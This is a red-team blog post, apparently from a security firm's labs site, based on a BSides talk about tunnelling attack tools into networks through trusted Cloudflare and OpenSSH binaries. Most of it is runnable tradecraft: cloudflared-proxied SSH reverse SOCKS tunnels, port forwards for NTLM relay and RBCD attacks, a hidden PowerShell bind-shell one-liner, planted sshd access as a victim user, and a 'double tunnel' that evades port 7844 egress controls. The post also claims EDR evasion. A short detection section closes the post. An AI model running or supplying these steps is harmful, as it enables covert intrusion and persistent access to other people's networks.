# https://labs.jumpsec.com/bring-your-own-trusted-binary-byotb-bsides-edition/

Bring Your Own Trusted Binary (BYOTB) – BSides Edition

Contents

Recently, I presented a talk on the main stage at BSides London 2024 and the topic I chose to present on was in regards to bringing trusted binaries to a system and using them in an adversarial fashion.

This post will cover what I presented and how to use these binaries in detail. If you would also like a copy of the slides they can be found [here.](https://github.com/Cyb3rC3lt/Cyb3rC3lt.github.io/blob/master/assets/files/BSides-BringYourOwnTrustedBinary(BYOTB).pdf)

My talk was mainly focused on binaries that allow for the passing of the following 5 scenarios:

- Proxy my Kali tools, and tunnel traffic into an environment
- Bypass EDR (e.g. CrowdStrike), on dropping to disk and on execution
- Firewall friendly
- A good alternative to network tunnelling tools (e.g. Ligolo)
- Doesn’t require a pre-installed SSH client

The first solution is pictured below where the ‘cloudflared’ binary from, you guessed it, Cloudflare can be used in conjunction with the SSH ‘ProxyCommand’ to allow ‘cloudflared’ to transport the SSH data out on port 443, instead of port 22, and also encapsulates the data as HTTPS rather than SSH.

This data then hits a Cloudflare hostname under our control, namely [`ssh.redteaming.org`](http://ssh.redteaming.org/) which is linked to a tunnel running on our Cloud VM. This data is then redirected into our SSH server running on our Cloud VM to complete the tunnel.

As discussed during the talk, given Cloudflare is a multi billion dollar company being used in perfectly legitimate ways by other big companies, this binary isn’t going anywhere anytime soon. So far I haven’t come across any issues with running the ‘cloudflared’ binary against multiple EDRs, including CrowdStrike. Obviously if you send hundreds of LDAP queries through this binary you will run into trouble, so OPSEC is still a requirement after initial access is gained.

The commands required to carry this out are quite simple. On a cloud VM like Kali, connect to your tunnel configured with the following command:

`> cloudflared tunnel run --token YourTokenHere

`

If you need to know more about setting up Cloudflare tunnels please see my [previous blog post](https://labs.jumpsec.com/putting-the-c2-in-c2loudflare/) on how to set it up.

Then, after starting the tunnel on Kali, you can run this command on the Windows client to complete the tunnel:

`> ssh.exe -o ProxyCommand="cloudflared.exe access ssh --hostname %h" [email protected] -R 1080

`

This SSH command uses “cloudflared” to transport the data out, but also opens up a reverse port forward and a socks proxy on port 1080 back on Kali. Obviously, at this point you also need a SSH client set up on your Kali VM. You could also use a SSH key file, use `-f` and `-N` to not execute commands, and lock down your SSH server so that the access is limited. However, for illustrative purposes, I am just going to log in to show you how it works.

Using Proxychains pointed at port 1080 we can then access the remote machine as follows:

You may wonder what happens on the hostname side of things when I am using [ssh.redteaming.org](http://ssh.redteaming.org/). All that happens there can be seen in the following image, whereby any data hitting [ssh.redteaming.org](http://ssh.redteaming.org/) I redirect it into my port 22 of my Kali VM to allow the SSH traffic inbound.

For the eagle eyed amongst you, it may have been spotted that I was using the built-in SSH, which means that relying on a system having SSH breaks one of my 5 tests mentioned earlier!

I learned that bringing the trusted SSH binary to a system is quite easy so if you go to [OpenSSH on Github](https://github.com/powershell/Win32-OpenSSH) you can bring the SSH binary to a system and it works quite well. All you have to ensure is to also put the `libcrypto.dll` into the same folder as the `ssh.exe` binary to make it operational.

Another thing I found quite useful when investigating trusted binaries is that both, the Cloudflared and SSH binaries, could easily be used to forward ports. If for example you wanted to coerce a web client to your host on port 8888 then forward it back to port 80 on Kali where Ntlmrelayx is listening to perform a RBCD style attack. This is all done over port 443 too for added OPSEC and it can be achieved with the following command:

`> ssh.exe -o ProxyCommand="cloudflared.exe access ssh --hostname %h" [email protected] -L 0.0.0.0:8888:localhost:80

`

When you have your tunnel up and running, it is also good to know that you can easily achieve command line access over the tunnel with either a PowerShell bind shell running on localhost, or by bringing another trusted binary such as SSHd to a system.

``Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList "-NoProfile -Command & {$listener=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback,9000); $listener.Start(); $client=$listener.AcceptTcpClient(); $stream=$client.GetStream(); $reader=[System.IO.StreamReader]::new($stream); $writer=[System.IO.StreamWriter]::new($stream); $writer.AutoFlush=$true; while ($client.Connected) { $writer.Write('PS ' + (Get-Location).Path + '> '); $command=$reader.ReadLine(); if ($command -eq 'exit') { break }; try { $output=Invoke-Expression $command 2>&1 | Out-String; $writer.WriteLine($output) } catch { $writer.WriteLine('Error: $_.Exception.Message') } }; $listener.Stop(); `$client.Close() }"

``

Then, when the bind listener is running, you can connect to it via Proxychains:

For SSHd access you can go back to your OpenSSH zip that you downloaded, and move the SSHd binary to the remote system as well as an `authorized_keys` file, `host` file, and `SSH_config` file. You can then run the SSHd server as follows to start it on port 7001 as previously defined in my `sshd_config` file:

Then back on Kali we can SSH to the remote server over the Cloudflare tunnel as shown:

The files I used to get SSHd up and running can be found [here.](https://github.com/Cyb3rC3lt/Cyb3rC3lt.github.io/blob/master/assets/files/sshd.zip) All that would be required to change is to add your Kali authorized key and a key for the victim machine. I discovered that you can copy your own Kali key twice, then just change the second one to point to a user on the victim machine by adding this to the end: ‘ekennedy@localhost’. Adding this will allow you to log in as the victim ‘ekennedy’ with your Kali password. Feel free to use my hosts keys file too for testing as it should just work as-is.

You will also have to update `sshd_config` to point to where your authorized keys file is located, and to avoid potential issues with permissions on the host file, you will need to save it within a standard user’s location on the file systems (e.g. Downloads, Music, etc.). As I noticed that when saved to `C:\temp` the system would complain about it not being restricted enough.

### A Different Solution

To elaborate further on the use of these trusted binaries, and to negate the need to use both SSH or Proxychains, I then started experimenting with Cloudflare’s WARP client which essentially acts like a VPN. Pictured below is how it is supposed to work:

With the WARP client running on your Kali VM and running the Cloudflared binary on the target machine we can use Netexec and our other Kali tools without requiring SSH or Proxychains to access the client network. The following images show how it can be achieved from both the Windows and Kali machine:

Windows Machine:

Kali without Proxychains:

The above solution proved to be very effective against multiple clients, but it was discovered that when running the ‘cloudflared tunnel’ command, it would operate over port 7844 outbound to establish a connection using either the TCP or UDP protocols. This therefore breaks 1 of my 5 tests which is that the technique needed to be ‘Firewall Friendly’. With that in mind I took a deep dive into the ‘cloudlfared’ code and discovered this hidden feature named `edge`.

This got me thinking. Could I use this undocumented feature to get around the port 7844 issue by redirecting the tunnel to a ‘cloudflared access’ listener on localhost, then taking the tunnel connection and egressing on a friendly port like 443? Then, once the tunnel reaches a hostname of my choosing, redirect it back again to where it really wants to go which is to the Cloudflare URL [region1.v2.argotunnel.com:7844](http://region1.v2.argotunnel.com:7844/)?

Here is the idea shown graphically, with the ‘double tunnel’ running on the client device and the [cfredirect.redteaming.org](http://cfredirect.redteaming.org/) hostname finally redirecting the data to port 7844.

The following is the hostname set up on Cloudflare’s dashboard:

And below, is the idea shown in commands, redirecting the ‘cloudflared tunnel’ data which wants to egress to 7844 to instead hit our ‘cloudflared access’ listener egressing on port 443. It is important to specify the protocol this time to be TCP (protocol http2) as it defaults to UDP and the Cloudflared access command can only operate over TCP:

On testing this, I found I could now form tunnels on more restrictive devices when all that was allowed outbound was port 443. Here is the double tunnel running on Windows in the first 2 images, and Netexec running on Kali seen accessing the client network:

One further thing to mention, when you are using this double tunnel setup I found that at times since it is all operating over TCP, that name resolution which occurs by default over UDP, forces you to use the `--dns-tcp` and `--dns-server` features of Netexec to operate correctly when using hostnames, although IP addresses will work fine. Other times it would work fine without specifying the dns settings so I am not entirely sure why it can be so hit or miss, but it is just something to keep an eye on.

If you also wanted to perform some NTLM relaying, you can achieve this with the the WARP client setup. It can be used like so, on your target machine:

`> cloudflared access tcp --hostname smb.redteaming.org --url 0.0.0.0:445

`

Then, create the [`smb.redteaming.org`](http://smb.redteaming.org/) hostname to point to port 445 on your localhost on your VM like we achieved with SSH.

Just to recap, here are the various techniques covered at this point and what is required to be in place to carry them out. There is no superior technique, but each offers another string to our bow during offensive engagements.

### How to mitigate this?

Given we always focus on the offensive side of things, following are some recommended checks to put in place to monitor for these attacks from a defensive perspective:

- **Process Telemetry**: Command line switches such as the words ‘tunnel’ or ‘access’ or ‘token’ could be used to alert on the fact that the Cloudflared binary may be in operation on your network. The ‘cloudflared’ name could also be used but this could be easily changed by an attacker to be Chrome or MSEdge for example.
- **DNS Logging**: During the operation of the Cloudflared binary, the hostnames being queried by it often end in “ [argotunnel.com](http://argotunnel.com/)“, including update checks which could be alerted upon by the Blue team. Just for reference, the [argotunnel.com](http://argotunnel.com/) domain is the old name for the Cloudflared binary.
- **Firewall Logging**: As we have discovered, circumventing the port 7844 limitation outbound is easily achievable with the ‘double tunnel’ technique but it would still be advised to block port 7844 outbound for both UDP and TCP if Cloudflared isn’t meant to be executed in your environment. The SSH technique doesn’t require port 7844 but that may not always be the chosen path a threat actor may use.
- **File Monitoring**: Monitoring file downloads from the Github [releases page](https://github.com/cloudflare/cloudflared/releases) for Cloudflared, as well as matching the provided hashes against what you allow in your network, will help you determine if the Cloudflared binary has been downloaded to your client device.

The above points would be the key things I would focus on from a detection point of view, hoping it will prove useful to defend your organisation from such attacks. I hope you enjoyed this discussion on abusing trusted binaries for adversarial purposes.

[Adversary Infrastructure](https://labs.jumpsec.com/category/adversary-infrastructure/), [Red Teaming](https://labs.jumpsec.com/category/red-teaming/)

This post is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.

Share[Twitter](https://twitter.com/intent/tweet?text=Bring%20Your%20Own%20Trusted%20Binary%20(BYOTB)%20%E2%80%93%20BSides%20Edition%20-%20JUMPSEC%20Labs&url=https%3A%2F%2Flabs.jumpsec.com%2Fbring-your-own-trusted-binary-byotb-bsides-edition%2F)[LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Flabs.jumpsec.com%2Fbring-your-own-trusted-binary-byotb-bsides-edition%2F)[Facebook](https://www.facebook.com/sharer/sharer.php?title=Bring%20Your%20Own%20Trusted%20Binary%20(BYOTB)%20%E2%80%93%20BSides%20Edition%20-%20JUMPSEC%20Labs&u=https%3A%2F%2Flabs.jumpsec.com%2Fbring-your-own-trusted-binary-byotb-bsides-edition%2F)[Link](https://labs.jumpsec.com/bring-your-own-trusted-binary-byotb-bsides-edition/)

## Trending Tags

[cve](https://labs.jumpsec.com/tag/cve/) [advisory](https://labs.jumpsec.com/tag/advisory/) [fullwidth](https://labs.jumpsec.com/tag/fullwidth/) [ivanti](https://labs.jumpsec.com/tag/ivanti/) [red team](https://labs.jumpsec.com/tag/red-team/) [red teaming](https://labs.jumpsec.com/tag/red-teaming/) [rce](https://labs.jumpsec.com/tag/rce/) [blueteam](https://labs.jumpsec.com/tag/blueteam/) [cloud red team](https://labs.jumpsec.com/tag/cloud-red-team/) [cve-2020-13770](https://labs.jumpsec.com/tag/cve-2020-13770/)